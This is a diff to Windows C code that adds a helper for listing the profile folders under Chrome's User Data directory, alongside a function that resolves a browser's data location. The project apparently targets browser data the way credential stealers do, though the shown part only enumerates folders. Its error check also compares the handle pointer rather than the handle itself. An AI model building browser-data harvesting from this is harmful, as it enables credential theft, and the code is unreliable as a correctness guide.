@@ -66,6 +66,7 @@ BOOL get_user_dir(GUID folder_id, PCWSTR browser_location, PWSTR buf_path, PSTR 
 	return TRUE;
 }
 
+// Check if specified 'test_string' is in 'substring'
 BOOL checkSubtring(const CHAR* substring, PCHAR test_string) {
 	if (lstrlenA(substring) <= lstrlenA(test_string)) {
 		for (int i = 0; i < lstrlenA(substring); i++) {
@@ -74,4 +75,27 @@ BOOL checkSubtring(const CHAR* substring, PCHAR test_string) {
 		return TRUE;
 	}
 	return FALSE;
+}
+
+// Gets file/directory exploration handle and a struct that contains info about the found files/sub-directories of the specified directory. Which then can be used to call FileNextA() to iterate over found files/sub-dirs. 
+BOOL get_file_explorer(PSTR chrome_dir, WIN32_FIND_DATAA* dir_files, HANDLE* dir_handle, PSTR buf_outMsg, WORD buf_outSize) {
+	errno_t err;
+
+	/* Append '\*' to the chrome_dir to get the file handle for the '%LOCALAPPDATA%\Google\Chrome\User Data\*' folder */
+	if ((err = strcat_s(chrome_dir, MAX_PATH, "\\*")) != 0) {
+		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending '\\\\*' to chrome_dir error: %d\n", err);)
+		return FALSE;
+	}
+
+	/* Gets the first file/folder handle in the directory, and set it to 'dir_handle' */
+	*dir_handle = FindFirstFileA(chrome_dir, dir_files);
+	if (dir_handle == INVALID_HANDLE_VALUE) {
+		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "Getting sub directories error: %lu\n", GetLastError());)
+		return FALSE;
+	}
+
+	/* Clears the ending '\*' part in the chrome_dir */
+	memset(chrome_dir + lstrlenA(chrome_dir) - 2, '\0', 2);
+
+	return TRUE;
 }
